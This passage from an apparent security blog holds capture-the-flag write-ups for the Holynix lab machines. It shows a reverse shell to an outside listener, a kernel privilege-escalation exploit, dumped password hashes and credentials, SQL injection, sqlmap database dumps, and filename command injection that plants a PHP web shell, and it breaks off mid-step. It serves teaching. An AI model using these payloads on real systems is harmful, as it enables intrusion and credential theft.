</span><span class='line'>150 Connecting to port 49625
</span><span class='line'>226-File successfully transferred
</span><span class='line'>226 0.000 seconds (measured here), 1.87 Mbytes per second
</span><span class='line'>610 bytes sent in 0.00 secs (29785.2 kB/s)</span></code></pre></td></tr></table></div></figure></p>

<p>The kernel was vulnerable (vmsplice, 5092.c) and because weevely shell always
logged out root user, we used reverse shell and the writable /dev/shm
directory.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/usr/share/exploitdb/platforms/linux/local# nc -lvp 1337
</span><span class='line'>listening on [any] 1337 &hellip;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>www-data@:/dev/shm $ :backdoor.reversetcp 192.168.1.34 -port 1337 -vector netcat-bsd
</span><span class='line'>[backdoor.reversetcp] [!] Error: Binding socket [Errno 98] Address already in use&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>www-data@:/dev/shm $ :file.upload /usr/share/exploitdb/platforms/linux/local/5092 5092</span></code></pre></td></tr></table></div></figure></p>

<p>On our Kali Linux:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>connect to [192.168.1.34] from www.zincftp.com [192.168.1.88] 49100
</span><span class='line'>/bin/sh: can&rsquo;t access tty; job control turned off
</span><span class='line'>$ chmod +x 5092
</span><span class='line'>$ ./5092
</span><span class='line'>bash: no job control in this shell
</span><span class='line'>root@holynix2:/dev/shm# cat /etc/shadow
</span><span class='line'>root:$1$wMs1EClc$90lJ2ckB8jbibX.yrE7ac0:14949:0:99999:7:::
</span><span class='line'>daemon:&lt;em>:14949:0:99999:7:::
</span><span class='line'>bin:&lt;/em>:14949:0:99999:7:::
</span><span class='line'>sys:&lt;em>:14949:0:99999:7:::
</span><span class='line'>sync:&lt;/em>:14949:0:99999:7:::
</span><span class='line'>games:&lt;em>:14949:0:99999:7:::
</span><span class='line'>man:&lt;/em>:14949:0:99999:7:::
</span><span class='line'>lp:&lt;em>:14949:0:99999:7:::
</span><span class='line'>mail:&lt;/em>:14949:0:99999:7:::
</span><span class='line'>&lt;a href="news:*:14949:0:99999:7:::">news:*:14949:0:99999:7:::&lt;/a>
</span><span class='line'>uucp:&lt;em>:14949:0:99999:7:::
</span><span class='line'>proxy:&lt;/em>:14949:0:99999:7:::
</span><span class='line'>www-data:&lt;em>:14949:0:99999:7:::
</span><span class='line'>backup:&lt;/em>:14949:0:99999:7:::
</span><span class='line'>list:&lt;em>:14949:0:99999:7:::
</span><span class='line'>irc:&lt;/em>:14949:0:99999:7:::
</span><span class='line'>gnats:&lt;em>:14949:0:99999:7:::
</span><span class='line'>nobody:&lt;/em>:14949:0:99999:7:::
</span><span class='line'>libuuid:!:14949:0:99999:7:::
</span><span class='line'>dhcp:&lt;em>:14949:0:99999:7:::
</span><span class='line'>syslog:&lt;/em>:14949:0:99999:7:::
</span><span class='line'>klog:&lt;em>:14949:0:99999:7:::
</span><span class='line'>bind:&lt;/em>:14949:0:99999:7:::
</span><span class='line'>sshd:*:14949:0:99999:7:::
</span><span class='line'>mysql:!:14949:0:99999:7:::
</span><span class='line'>lsanderson:$1$d1rHIv2m$301/2naFEYQbmjg/CJZbO0:14949:0:99999:7:::
</span><span class='line'>cfinnerly:$1$7BPRHJcw$3W/9R.1BNqMJvvHWSa9jC/:14949:0:99999:7:::
</span><span class='line'>ddonnovan:$1$.aIQOdgq$JnPLWS9ETJEmPvvMZFgqK.:14949:0:99999:7:::
</span><span class='line'>skrymple:$1$nCenIeL7$3fq23HWXI1/cYX7q9FGVa0:14949:0:99999:7:::
</span><span class='line'>amckinley:$1$cZn8zx7p$0oURMPJj4U9UM0XhmhQM71:14951:0:99999:7:::
</span><span class='line'>cmahong:!:14949:0:99999:7:::
</span><span class='line'>lnickerbacher:!:14949:0:99999:7:::
</span><span class='line'>jstreet:!:14949:0:99999:7:::
</span><span class='line'>rwoo:!:14949:0:99999:7:::
</span><span class='line'>kmccallum:!:14949:0:99999:7:::
</span><span class='line'>cjalong:!:14949:0:99999:7:::
</span><span class='line'>jsmith:!:14949:0:99999:7:::
</span><span class='line'>dhammond:!:14949:0:99999:7:::
</span><span class='line'>hmcknight:!:14949:0:99999:7:::
</span><span class='line'>lwestre:!:14949:0:99999:7:::
</span><span class='line'>gwelch:!:14949:0:99999:7:::
</span><span class='line'>dmoran:!:14949:0:99999:7:::
</span><span class='line'>dsummers:!:14949:0:99999:7:::
</span><span class='line'>bzimmerman:!:14949:0:99999:7:::
</span><span class='line'>ncobol:!:14949:0:99999:7:::
</span><span class='line'>ddypsky:!:14949:0:99999:7:::
</span><span class='line'>rcropper:!:14949:0:99999:7:::
</span><span class='line'>cbergey:!:14949:0:99999:7:::
</span><span class='line'>tmartin:!:14949:0:99999:7:::
</span><span class='line'>jgacy:!:14949:0:99999:7:::
</span><span class='line'>splath:!:14949:0:99999:7:::
</span><span class='line'>evorhees:!:14949:0:99999:7:::
</span><span class='line'>rfrost:!:14949:0:99999:7:::
</span><span class='line'>ahuxley:!:14949:0:99999:7:::
</span><span class='line'>webmaster:!:14949:0:99999:7:::
</span><span class='line'>cmanson:!:14949:0:99999:7:::
</span><span class='line'>v&lt;a href="ftp:!:14949:0:99999:7:::">ftp:!:14949:0:99999:7:::&lt;/a></span></code></pre></td></tr></table></div></figure></p>

<p>We also found:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@holynix2:/var/www/dev# cat dbconn.php
</span><span class='line'>&lt;?php
</span><span class='line'>        $db_host = &lsquo;localhost&rsquo;;
</span><span class='line'>        $db_user = &lsquo;root&rsquo;;
</span><span class='line'>        $db_pass = &lsquo;dynamo59956783&rsquo;;
</span><span class='line'>        $db_name = &lsquo;_zincftp_data&rsquo;;
</span><span class='line'>        $conn = mysql_connect($db_host, $db_user, $db_pass) or die(&ldquo;Unable to connect to MySQL&rdquo;);
</span><span class='line'>        mysql_select_db($db_name,$conn) or die(&ldquo;Could not select Database&rdquo;);</span></code></pre></td></tr></table></div></figure></p>

<p>If there is not a vulnerable phpmyadmin, we can read the files to table too, according:</p>

<p>1) zincftp_data ->  Create new table on database zincftp_data</p>

<p>2) Name = ftp_pass, Number of fields = 1</p>

<p>3) Field = pass, Type = varchar, Length = 100</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>SQL Query Window:&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>LOAD DATA LOCAL INFILE &lsquo;/etc/pure-ftpd/pureftpd.passwd&rsquo; INTO TABLE ftp_pass LINES TERMINATED BY &lsquo;\n&rsquo;</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Holynix: V1]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/10/holynix-v1/"/>
    <updated>2015-05-10T13:54:06+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/10/holynix-v1</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/holynix-v1,20/">Holynix: v1</a></p>

<p>We set networking in Vmware Fusion as &ldquo;Share with my Mac&rdquo; and check the
obtained IP address:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/var/db/vmware:
</span><span class='line'>lease 192.168.80.142 {
</span><span class='line'>        starts 4 2015/04/30 16:18:54;
</span><span class='line'>        ends 4 2015/04/30 16:48:54;
</span><span class='line'>        hardware ethernet 00:0c:29:bc:05:de;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure></p>

<p>Nmap output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nmap -sV -p- 192.168.80.142&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Starting Nmap 6.47 ( &lt;a href="http://nmap.org">http://nmap.org&lt;/a> ) at 2015-04-27 07:16 CEST
</span><span class='line'>Nmap scan report for 192.168.80.142
</span><span class='line'>Host is up (0.00028s latency).
</span><span class='line'>Not shown: 65534 closed ports
</span><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch)
</span><span class='line'>MAC Address: 00:0C:29:BC:05:DE (VMware)</span></code></pre></td></tr></table></div></figure></p>

<p>There is a SQL injection in the web login, we submit the following username and password:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>test' or &lsquo;1&rsquo;=&lsquo;1</span></code></pre></td></tr></table></div></figure></p>

<p>Via security (ssp.php) we can disclose arbitrary file (for example /etc/passwd):
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>&lt;a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh&lt;/a>
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span><span class='line'>dhcp:x:101:102::/nonexistent:/bin/false
</span><span class='line'>syslog:x:102:103::/home/syslog:/bin/false
</span><span class='line'>klog:x:103:104::/home/klog:/bin/false
</span><span class='line'>sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>mysql:x:105:114:MySQL Server,,,:/var/lib/mysql:/bin/false
</span><span class='line'>alamo:x:1000:115::/home/alamo:/bin/bash
</span><span class='line'>etenenbaum:x:1001:100::/home/etenenbaum:/bin/bash
</span><span class='line'>gmckinnon:x:1002:100::/home/gmckinnon:/bin/bash
</span><span class='line'>hreiser:x:1003:50::/home/hreiser:/bin/bash
</span><span class='line'>jdraper:x:1004:100::/home/jdraper:/bin/bash
</span><span class='line'>jjames:x:1005:50::/home/jjames:/bin/bash
</span><span class='line'>jljohansen:x:1006:115::/home/jljohansen:/bin/bash
</span><span class='line'>ltorvalds:x:1007:113::/home/ltorvalds:/bin/bash
</span><span class='line'>kpoulsen:x:1008:100::/home/kpoulsen:/bin/bash
</span><span class='line'>mrbutler:x:1009:50::/home/mrbutler:/bin/bash
</span><span class='line'>rtmorris:x:1010:100::/home/rtmorris:/bin/bash</span></code></pre></td></tr></table></div></figure></p>

<p>With sqlmap we can dump the whole database (%40 means &lsquo;@&rsquo; character):
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>sqlmap -u &ldquo;&lt;a href="http://192.168.80.142/index.php?page=login.php&amp;user_name=a&amp;password=a&amp;Submit_button=Submit">http://192.168.80.142/index.php?page=login.php&amp;user_name=a&amp;password=a&amp;Submit_button=Submit&lt;/a>&rdquo; &ndash;dump-all&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.142/dump# cat creds/accounts.csv
</span><span class='line'>cid,upload,username,password
</span><span class='line'>1,0,alamo,Ih%40cK3dM1cR05oF7
</span><span class='line'>2,1,etenenbaum,P3n7%40g0n0wN3d
</span><span class='line'>3,1,gmckinnon,d15cL0suR3Pr0J3c7
</span><span class='line'>4,1,hreiser,Ik1Ll3dNiN%40r315er
</span><span class='line'>5,1,jdraper,p1%40yIngW17hPh0n35
</span><span class='line'>6,1,jjames,%40rR35t3D%40716
</span><span class='line'>7,1,jljohansen,m%40k1nGb0o7L3g5
</span><span class='line'>8,1,kpoulsen,wH%407ar37H3Fed5D01n
</span><span class='line'>9,0,ltorvalds,f%407H3r0FL1nUX
</span><span class='line'>10,1,mrbutler,n%405aHaSw0rM5
</span><span class='line'>11,1,rtmorris,Myd%40d51N7h3NSA</span></code></pre></td></tr></table></div></figure></p>

<p>Using sqlmap &ndash;passwords parameter we got:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>database management system users password hashes:
</span><span class='line'>[&lt;em>] debian-sys-maint [1]:
</span><span class='line'>    password hash: %2A04DDBBF6BA7B43D9B78611E125C80124644D17B8
</span><span class='line'>[&lt;/em>] root [1]:
</span><span class='line'>    password hash: %2AA69F92BBDEA591F5BB9E4A049F0C181D6DB5177E</span></code></pre></td></tr></table></div></figure></p>

<p>Back to the web page, there is a cookie set as &lsquo;uid=1&rsquo;. We can try different
numbers, because not every user has allowed to upload file, see accounts.csv.</p>

<p>We disclose transfer.php script:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">if</span> <span class="p">(</span> <span class="nv">$auth</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&lt;</span><span class="nx">center</span><span class="o">&gt;&lt;</span><span class="nx">h2</span><span class="o">&gt;</span><span class="nx">Content</span> <span class="nx">Restricted</span><span class="o">&lt;/</span><span class="nx">h2</span><span class="o">&gt;&lt;/</span><span class="nx">center</span><span class="o">&gt;&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span> <span class="nv">$upload</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>                <span class="nv">$homedir</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">/</span><span class="nx">home</span><span class="o">/&amp;</span><span class="nx">rdquo</span><span class="p">;</span><span class="o">.</span><span class="nv">$logged_in_user</span><span class="o">.</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">/&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>                <span class="nv">$uploaddir</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">upload</span><span class="o">/&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>                <span class="nv">$target</span> <span class="o">=</span> <span class="nv">$uploaddir</span> <span class="o">.</span> <span class="nb">basename</span><span class="p">(</span> <span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">FILES</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">uploaded</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;][</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;])</span> <span class="p">;</span>
</span><span class='line'>                <span class="nv">$uploaded_type</span> <span class="o">=</span> <span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">FILES</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">uploaded</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;][</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">type</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;];</span>
</span><span class='line'>                <span class="nv">$command</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'>                <span class="nv">$ok</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;</span><span class="nx">code</span><span class="o">&gt;</span>            <span class="k">if</span> <span class="p">(</span> <span class="nv">$uploaded_type</span> <span class="o">==</span><span class="s2">&quot;application/gzip&quot;</span> <span class="o">&amp;</span><span class="nx">amp</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">amp</span><span class="p">;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;autoextract&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;true&#39;</span> <span class="p">)</span> <span class="p">{</span> <span class="nv">$command</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="nv">$ok</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>                    <span class="k">echo</span> <span class="s2">&quot;Sorry your file was not uploaded&quot;</span><span class="p">;</span>
</span><span class='line'>                    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=&#39;?index.php?page=upload.php&#39; &amp;gt;Back to upload page&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>                    <span class="k">if</span><span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploaded&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$target</span><span class="p">))</span>
</span><span class='line'>                    <span class="p">{</span>
</span><span class='line'>                            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;h3&amp;gt;The file &#39;&quot;</span> <span class="o">.</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploaded&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span> <span class="s2">&quot;&#39; has been uploaded.&amp;lt;/h4&amp;gt;&amp;lt;br /&amp;gt;&quot;</span><span class="p">;</span>
</span><span class='line'>                            <span class="k">echo</span> <span class="s2">&quot;The ownership of the uploaded file(s) have been changed accordingly.&quot;</span><span class="p">;</span>
</span><span class='line'>                            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br /&amp;gt;&amp;lt;a href=&#39;?page=upload.php&#39; &amp;gt;Back to upload page&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
</span><span class='line'>                            <span class="k">if</span> <span class="p">(</span> <span class="nv">$command</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
</span><span class='line'>                            <span class="p">{</span>
</span><span class='line'>                                    <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;sudo tar xzf &quot;</span> <span class="o">.</span><span class="nv">$target</span><span class="o">.</span> <span class="s2">&quot; -C &quot;</span> <span class="o">.</span><span class="nv">$homedir</span><span class="p">);</span>
</span><span class='line'>                                    <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;rm &quot;</span> <span class="o">.</span><span class="nv">$target</span><span class="p">);</span>
</span><span class='line'>                            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>                                    <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;sudo mv &quot;</span> <span class="o">.</span><span class="nv">$target</span><span class="o">.</span> <span class="s2">&quot; &quot;</span> <span class="o">.</span><span class="nv">$homedir</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploaded&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span><span class='line'>                            <span class="p">}</span>
</span><span class='line'>                            <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;/var/apache2/htdocs/update_own&quot;</span><span class="p">);</span>
</span><span class='line'>                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>                            <span class="k">echo</span> <span class="s2">&quot;Sorry, there was a problem uploading your file.&amp;lt;br /&amp;gt;&quot;</span><span class="p">;</span>
</span><span class='line'>                            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br /&amp;gt;&amp;lt;a href=&#39;?page=upload.php&#39; &amp;gt;Back to upload page&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
</span><span class='line'>                    <span class="p">}</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br /&amp;gt;&amp;lt;br /&amp;gt;&amp;lt;h3&amp;gt;Home directory uploading disabled for user &quot;</span> <span class="o">.</span><span class="nv">$logged_in_user</span><span class="o">.</span> <span class="s2">&quot;&amp;lt;/h3&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></p>

<p>As we can see from the source code, the filename is used in shell command and
we can inject malicious input. However the &lsquo;/&rsquo; or &lsquo;\&rsquo; characters are
prohibited, because to $target is stored only the value after (back)slash.</p>

<p>Locator (it never terminates, but confirms our finding):
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Content-Disposition: form-data; name=&ldquo;uploaded&rdquo;; filename=&ldquo;;yes;&rdquo;</span></code></pre></td></tr></table></div></figure></p>

<p>We can evade the slash restriction encoding the payload as base64 (touch /tmp/owned):
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Content-Disposition: form-data; name=&ldquo;uploaded&rdquo;; filename=&ldquo;;&lt;code>echo dG91Y2ggL3RtcC9vd25lZA==| base64 -d&lt;/code>;&rdquo;</span></code></pre></td></tr></table></div></figure></p>

<p>There could be a problem with a bigger input (&ldquo;filename too long&rdquo;).</p>

<p>Similarly we upload the following base64 payload:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/var/www# echo &lsquo;&lt;?php system($_REQUEST['cmd&rsquo;]); ?>&lsquo; | base64
</span><span class='line'>PD9waHAgc3lzdGVtKCRfUkVRVUVTVFtjbWRdKTsgPz4K</span></code></pre></td></tr></table></div></figure></p>

<p>We try our php shell and in the case of success, we upload weevely from our web server:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
